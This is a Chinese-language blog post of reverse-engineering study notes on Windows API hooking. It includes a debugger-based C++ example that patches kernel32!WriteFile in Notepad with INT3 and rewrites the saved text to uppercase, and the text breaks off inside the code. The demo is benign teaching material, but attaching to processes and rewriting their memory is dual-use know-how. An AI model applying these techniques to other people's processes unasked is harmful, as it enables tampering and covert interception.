<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>re-core-principle-3 | wd-z711&#39;s B10g</title>
  <meta name="author" content="wd-z711">
  
  <meta name="description" content="Common student in China. Interested in web &amp; re.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="re-core-principle-3"/>
  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-YHJSKZDC3Y', 'auto');
  ga('send', 'pageview');
</script>




<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> re-core-principle-3</h1>
		</div>
	



<div class="row post">

	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="逆向工程核心原理笔记-3"><a href="#逆向工程核心原理笔记-3" class="headerlink" title="逆向工程核心原理笔记-3"></a>逆向工程核心原理笔记-3</h1><h2 id="0x00-API钩取：逆向分析之花"><a href="#0x00-API钩取：逆向分析之花" class="headerlink" title="0x00 API钩取：逆向分析之花"></a>0x00 API钩取：逆向分析之花</h2><p>&emsp;代码逆向分析中，钩取(Hooking)是一种截取信息、更改程序执行流向、添加新功能的技术。钩取的流程如下：（1）使用反汇编器/调试器熟悉程序的结构与工作原理；（2）开发钩子代码；（3）操作可执行文件与进程内存，部署钩子代码。</p>
<p>&emsp;其中，钩取<code>Win32 API</code>的技术被称为API钩取。分析程序时若有程序源码，大部分情况都不需要使用钩取技术。</p>
<span id="more"></span>
<h3 id="API概念"><a href="#API概念" class="headerlink" title="API概念"></a>API概念</h3><p>&emsp;API(Application Programming Interface，应用程序编程接口)。Windows中，程序要使用系统资源（内存、文件、网络、视频、音频等）时无法直接访问，这些资源都是由Windows管理的，Windows禁止用户程序直接访问它们。程序需要使用这些资源时，必须向系统内核（Kernel）申请，申请的方法就是使用微软提供的API。下图为32位windows进程内存的情况：</p>
<p><img src="/images/re-core-principle-3/image-20230405142732789.png" alt="image-20230405142732789" style="zoom:50%;" /></p>
<p>&emsp;可以看到，由<code>ntdll.dll</code>向内核提出申请。</p>
<p>&emsp;所有进程都会默认加载<code>kernel32.dll</code>库（但是有一些例外），<code>kernel32.dll</code>又会加载<code>ntdll.dll</code>库。在GUI程序中，必须加载<code>user32.dll</code>与<code>gdi32.dll</code>库。</p>
<h3 id="API钩取"><a href="#API钩取" class="headerlink" title="API钩取"></a>API钩取</h3><p>&emsp;正常调用API过程举例：（1）在应用程序代码区域中调用<code>CreateFile API</code>。（2）由于<code>CreateFile API</code>是<code>kerel32.dll</code>的导出函数，所以，<code>kernel32.dll</code>区域中的<code>CreateFile API</code>会被调用执行并正常返回。</p>
<p><img src="/images/re-core-principle-3/image-20230405144646893.png" alt="image-20230405144646893" style="zoom:50%;" /></p>
<p>&emsp;API钩取调用过程举例：用户先使用DLL注入技术将<code>hook.dll</code>注入目标进程的内存空间。（2）用<code>hook!MyCreateFile</code>钩取对<code>kernel32!CreateFile</code>的调用。（3）每当目标进程要调用<code>kernel32!CreateFile</code>时都会先调用<code>hook!MyCreateFile</code>。</p>
<p><img src="/images/re-core-principle-3/image-20230405144907630.png" alt="image-20230405144907630" style="zoom:50%;" /></p>
<h3 id="API钩取技术图表（Tech-Map）"><a href="#API钩取技术图表（Tech-Map）" class="headerlink" title="API钩取技术图表（Tech Map）"></a>API钩取技术图表（Tech Map）</h3><p>&emsp;常用的技术在下图中已用下划线标出。</p>
<p><img src="/images/re-core-principle-3/image-20230405145131293.png" alt="image-20230405145131293" style="zoom:50%;" /></p>
<p>&emsp;动态与静态钩取的不同如下：</p>
<p><img src="/images/re-core-principle-3/image-20230405145603209.png" alt="image-20230405145603209" style="zoom:50%;" /></p>
<p>&emsp;钩取位置：</p>
<ul>
<li><strong>IAT。</strong>将程序内部的API地址更改为钩取函数地址。该方法的优点是实现起来非常简单，缺点是无法钩取不在IAT而在程序中使用的API，如动态加载并使用DLL时。</li>
<li>代码。系统库(<code>*.dll</code>)映射到进程内存时，从中查找API的实际地址，并直接修改代码。</li>
</ul>
<p>&emsp;向目标进程内存设置钩取函数的具体技术：</p>
<ul>
<li><strong>调试。</strong>这里所说的调试器并不是<code>OllyDbg</code>等，而是用户直接编写的、用来钩取的程序（在用户编写的程序中使用调试API附加到目标进程）。当然也可以在<code>ollyDbg</code>上使用自动化脚本，自动钩取API。使用这种方法，即便是在钩取API的过程中，用户也可以暂停程序运行，进行添加、修改、删除API钩取等操作。</li>
<li><strong>注入。</strong>DLL注入与代码注入。</li>
</ul>
<h2 id="0x01-记事本WriteFile的API钩取（调试器）"><a href="#0x01-记事本WriteFile的API钩取（调试器）" class="headerlink" title="0x01 记事本WriteFile的API钩取（调试器）"></a>0x01 记事本WriteFile的API钩取（调试器）</h2><p>&emsp;此章主要讲解以下API钩取技术<strong>（红框）</strong>：</p>
<p><img src="/images/re-core-principle-3/image-20230405151244207.png" alt="image-20230405151244207" style="zoom:50%;" /></p>
<p>&emsp;本章的钩取将会向用户提供简单的接口，使用户能够控制目标进程的运行，并且可以使用进程内存。</p>
<h3 id="调试器相关知识"><a href="#调试器相关知识" class="headerlink" title="调试器相关知识"></a>调试器相关知识</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调试器(Debugger)  :进行调试的程序</span><br><span class="line">被调试者(Debuggee):被调试的程序</span><br></pre></td></tr></table></figure>
<p>&emsp;调试器可以逐一执行被调试者的命令，并拥有对寄存器和内存的所有访问权限。</p>
<p>&emsp;<strong>调试器的工作原理：</strong>调试进程经过注册后，每当被调试者发生调试事件(<code>Debug Event</code>)时，OS就会暂停其运行并向调试器报告相应事件。调试器对相应事件做适当处理后，使被调试者继续运行。其中，一般的异常(Exception)也属于调试事件。若相应进程处于非调试，调试事件会在其被调试程序自身的异常处理或OS的异常处理机制中被处理掉。调试器无法处理或不关心的调试事件最终由OS处理。</p>
<p>&emsp;调试器工作原理如下图所示：</p>
<p><img src="/images/re-core-principle-3/image-20230405151803730.png" alt="image-20230405151803730" style="zoom:50%;" /></p>
<p>&emsp;各种调试事件(<code>Debug Event</code>)如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_DEBUG_EVENT</span><br><span class="line">CREATE_THREAD_DEBUG_EVENT</span><br><span class="line">CREATE_PROCESS_DEBUG_EVENT</span><br><span class="line">EXIT_THREAD_DEBUG_EVENT</span><br><span class="line">EXIT_PROCESS_DEBUG_EVENT</span><br><span class="line">LOAD_DLL_DEBUG_EVENT</span><br><span class="line">UNLOAD_DLL_DEBUG_EVENT</span><br><span class="line">OUTPUT_DEBUG_STRING_EVENT</span><br><span class="line">RIP_EVENT</span><br></pre></td></tr></table></figure>
<p>&emsp;上述调试事件中，真正与调试相关的事件是：<code>EXCEPTION_DEBUG_EVENT</code>，与其相关的异常有很多，例如<code>EXCEPTION_BREAKPOINT</code>，表示断点。</p>
<p>&emsp;断点对应的汇编指令为<code>INT3</code>，IA-32指令为<code>0xCC</code>。代码调试遇到<code>INT3</code>指令即中断运行。调试器实现断点的方法：（1）找到要设置断点的代码在内存中的起始地址，把1个字节修改为<code>0xCC</code>。（2）若想继续调试，将它恢复原值即可。</p>
<p>&emsp;<strong>注：</strong>IA-32代表32位版本的x86指令集架构，由Intel设计。</p>
<h3 id="调试技术流程"><a href="#调试技术流程" class="headerlink" title="调试技术流程"></a>调试技术流程</h3><p>&emsp;下面说明借助调试技术钩取API的方法。基本思路是：<strong>将被调试者的API起始部分修改为<code>0xCC</code>，控制权转移到调试器后执行指定操作，最后使被调试者重新进入运行状态。</strong><br>&emsp;具体流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 对想钩取的进程进行附加操作，使之成为被调试者</span><br><span class="line">2. &quot;钩子&quot;:将API起始地址的第一个字节修改为0xCC</span><br><span class="line">3. 调用相应API时，控制权转移到调试器执行所需操作(操作参数、返回值等)</span><br><span class="line">4. 脱钩:将0xCC恢复原值(为了正常运行API)</span><br><span class="line">5. 运行相应API(无0xCC的正常状态)</span><br><span class="line">6. &quot;钩子&quot;:再次将API起始地址的第一个字节修改为0xCC(为了继续钩取)</span><br><span class="line">7. 控制权返还被调试者</span><br></pre></td></tr></table></figure>
<h3 id="练习：记事本WriteFile的API钩取"><a href="#练习：记事本WriteFile的API钩取" class="headerlink" title="练习：记事本WriteFile的API钩取"></a>练习：记事本WriteFile的API钩取</h3><p>&emsp;此示例的功能：<strong>钩取<code>Notepad.exe</code>的<code>WriteFile()</code>，保存文件时操作输入参数，将小写字母全部转换为大写字母。即，在Notepad中保存文件内容时，其中输入的所有小写字母都会先被转换为大写字母，然后再保存。</strong>感觉挺有意思，效果如下所示：</p>
<p><img src="/images/re-core-principle-3/image-20230405153923656.png" alt="image-20230405153923656" style="zoom:50%;" /></p>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>&emsp;假设notepad要保存文件中的某些内容时会调<code>kernel32!WriteFile</code>，那么我们首先要确定一下假设是否正确。</p>
<p>&emsp;<code>kernel32!WriteFile</code>的定义如下：</p>
<p><img src="/images/re-core-principle-3/image-20230405154156622.png" alt="image-20230405154156622" style="zoom:50%;" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lpBuffer: 数据缓冲区指针</span><br><span class="line">nNumberOfBytesToWrite: 要写入的字节数</span><br></pre></td></tr></table></figure>
<p>&emsp;打开<code>Notepad.exe</code>，在<code>kernel32!WriteFile</code>打断点，然后输入字符后，保存，程序停在了<code>kernel32!WriteFile</code>处。此时堆栈结构如下：</p>
<p><img src="/images/re-core-principle-3/image-20230405161206187.png" alt="image-20230405161206187" style="zoom:70%;" /></p>
<p>&emsp;上述红框地址保存了输入到Notepad中的的字符。</p>
<p>&emsp;那么我们确定，notepad要保存文件内容时会调<code>kernel32!WriteFile</code>。且我们验证了我们的思路：<strong>钩取<code>WriteFile</code>后，用指定字符串覆盖上述红框中的字符串即可完成上述功能。</strong></p>
<p>&emsp;下面我们使用调试方法来钩取API。利用给出的<code>hookdbg.exe</code>，在<code>WriteFile</code>起始地址处设置断点(<code>INT3</code>)后，被调试进程(<code>notepad.exe</code>)保存文件时，<code>EXCEPTION_BREAKPOINT</code>事件就会传给调试器(<code>hookdbg.exe</code>)。</p>
<p>&emsp;此时被调试者(<code>notepad.exe</code>)的EIP值不是<code>WriteFile</code>的起始地址，而是<code>WriteFile</code>的起始地址+1。为什么呢？<strong>原因在于，我们在<code>WriteFile</code> API的起始地址处设置了断点，被调试者(<code>notepad.exe</code>)内部调用<code>WriteFile</code>时，会在起始地址遇到INT3(<code>0xCC</code>)指令。执行该指令后EIP的值会增加1个字节，然后控制权会转移给调试器(<code>hookdbg.exe</code>)。因为在调试器被调试者关系中，被调试者中发生的异常需要由调试器处理。覆写了数据缓冲区的内容(将<code>0xCC</code>改为原来的值)后，EIP值被重新更改为<code>WriteFile</code>的起始地址继续运行。</strong><code>Ollydbg</code>也是这样做的，只不过页面不展示。</p>
<p>&emsp;下面分析<code>hookdbg.exe</code>的代码，注释写的很清楚了，不再赘述。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookdbg.cpp -&gt; hookdbg.exe</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">LPVOID g_pfWriteFile = <span class="literal">NULL</span>;</span><br><span class="line">CREATE_PROCESS_DEBUG_INFO g_cpdi;</span><br><span class="line">BYTE g_chINT3 = <span class="number">0xCC</span>, g_chOrgByte = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被调试进程启动时</span></span><br><span class="line"><span class="function">BOOL <span class="title">OnCreateProcessDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取WriteFile() API地址</span></span><br><span class="line">	<span class="comment">// 获取的是调试进程的WriteFile() API地址，由于对于windows os的系统DLL而言，DLL在所有进程中都加载到相同地址，所以这样可以</span></span><br><span class="line">    g_pfWriteFile = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;WriteFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// API Hook - WriteFile()</span></span><br><span class="line">    <span class="comment">// 更改WriteFile()第一个字节为0xCC(INT3)</span></span><br><span class="line">	<span class="comment">// 将事件信息保存在g_cpdi中</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, <span class="built_in">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));</span><br><span class="line">	<span class="comment">// 读取目标进程中WriteFile() API的第一个字节到g_chOrgByte中</span></span><br><span class="line">	<span class="comment">// 后续正常运行WriteFile()时要用到</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                      &amp;g_chOrgByte, <span class="built_in">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 将目标进程中WriteFile() API的第一个字节改为0xCC</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                       &amp;g_chINT3, <span class="built_in">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被调试进程遇到INT3时</span></span><br><span class="line"><span class="function">BOOL <span class="title">OnExceptionDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    PBYTE lpBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;</span><br><span class="line">    PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是否是断点</span></span><br><span class="line">    <span class="keyword">if</span>( EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 判断断点是否在WriteFile() API处</span></span><br><span class="line">        <span class="keyword">if</span>( g_pfWriteFile == per-&gt;ExceptionAddress )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// #1. Unhook-脱钩</span></span><br><span class="line">            <span class="comment">// 将WriteFile() API首字节改为g_chOrgByte，改成原值</span></span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                               &amp;g_chOrgByte, <span class="built_in">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #2. Thread Context-获取被调试线程上下文</span></span><br><span class="line">			<span class="comment">// 所有程序在内存中都以进程为单位运行，而进程的实际指令代码以线程为单位运行。</span></span><br><span class="line">			<span class="comment">// Windows 是一个多线程(multi-thread)操作系统，同一进程中可以同时运行多个线程。</span></span><br><span class="line">			<span class="comment">// 多任务(multi-tasking)是将CPU资源划分为多个时间片(time-slice)，然后平等地逐一运行所有线程(考虑线程优先级)。</span></span><br><span class="line">			<span class="comment">// CPU运行完一个线程的时间片而切换到其他线程时间片时，它必须将先前线程处理的内容准确保存下来，这样再次运行它时才能正常无误。</span></span><br><span class="line">            <span class="comment">// 保存到ctx中，ctx是一个结构体，里面保存了各个寄存器的值</span></span><br><span class="line">			ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">            <span class="built_in">GetThreadContext</span>(g_cpdi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #3. 获得WriteFile() 第 2, 3 个参数，也就是LpBuffer，nNumber0fBytesTowrite</span></span><br><span class="line">            <span class="comment">//   param 2 : ESP + 0x8</span></span><br><span class="line">            <span class="comment">//   param 3 : ESP + 0xC</span></span><br><span class="line">			<span class="comment">// 分别将参数保存到 dwAddrOfBuffer 与 dwNumOfBytesToWrite 中</span></span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0x8</span>), </span><br><span class="line">                              &amp;dwAddrOfBuffer, <span class="built_in">sizeof</span>(DWORD), <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0xC</span>), </span><br><span class="line">                              &amp;dwNumOfBytesToWrite, <span class="built_in">sizeof</span>(DWORD), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 接下来就是把小写字母转为大写字母，并放到原来的位置</span></span><br><span class="line">            <span class="comment">// #4. 分配临时缓冲区lpBuffer</span></span><br><span class="line">            lpBuffer = (PBYTE)<span class="built_in">malloc</span>(dwNumOfBytesToWrite+<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">memset</span>(lpBuffer, <span class="number">0</span>, dwNumOfBytesToWrite+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #5. 复制 WriteFile() 的dwAddrOfBuffer所指的字符串到临时缓冲区</span></span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, </span><br><span class="line">                              lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n### original string ###\n%s\n&quot;</span>, lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #6. 将小写字母转为大写字母</span></span><br><span class="line">            <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; dwNumOfBytesToWrite; i++ )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>( <span class="number">0x61</span> &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= <span class="number">0x7A</span> )</span><br><span class="line">                    lpBuffer[i] -= <span class="number">0x20</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n### converted string ###\n%s\n&quot;</span>, lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #7. 将lpBuffer放回原位</span></span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, </span><br><span class="line">                               lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// #8. 删除分配的临时缓冲区</span></span><br><span class="line">            <span class="built_in">free</span>(lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #9. 把线程上下文的EIP修改为WriteFile()起始地址，并恢复上下文</span></span><br><span class="line">            ctx.Eip = (DWORD)g_pfWriteFile;</span><br><span class="line">            <span class="built_in">SetThreadContext</span>(g_cpdi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #10. 继续运行被调试进程</span></span><br><span class="line">            <span class="built_in">ContinueDebugEvent</span>(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);</span><br><span class="line">			<span class="built_in">Sleep</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #11. 重新设置API Hook，把首字母设成0xCC，方便下次钩取</span></span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                               &amp;g_chINT3, <span class="built_in">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DebugLoop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DEBUG_EVENT de;</span><br><span class="line">    DWORD dwContinueStatus;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待被调试者发生调试事件</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="built_in">WaitForDebugEvent</span>(&amp;de, INFINITE))</span><br><span class="line">    &#123;</span><br><span class="line">        dwContinueStatus = DBG_CONTINUE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 被调试进程创建事件</span></span><br><span class="line">		<span class="comment">// 被调试进程启动或者attached时调用该函数</span></span><br><span class="line">        <span class="keyword">if</span>( CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">OnCreateProcessDebugEvent</span>(&amp;de);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 异常事件</span></span><br><span class="line">		<span class="comment">// 说明遇到了INT3指令</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">OnExceptionDebugEvent</span>(&amp;de))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 被调试进程终止事件</span></span><br><span class="line">		<span class="comment">// 不调试了，结束了</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 被调试者终止 -&gt; 调试者终止</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使得被调试者继续运行，相当于F9</span></span><br><span class="line">        <span class="built_in">ContinueDebugEvent</span>(de.dwProcessId, de.dwThreadId, dwContinueStatus);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nUSAGE : hookdbg.exe &lt;pid&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Attach Process</span></span><br><span class="line">    dwPID = <span 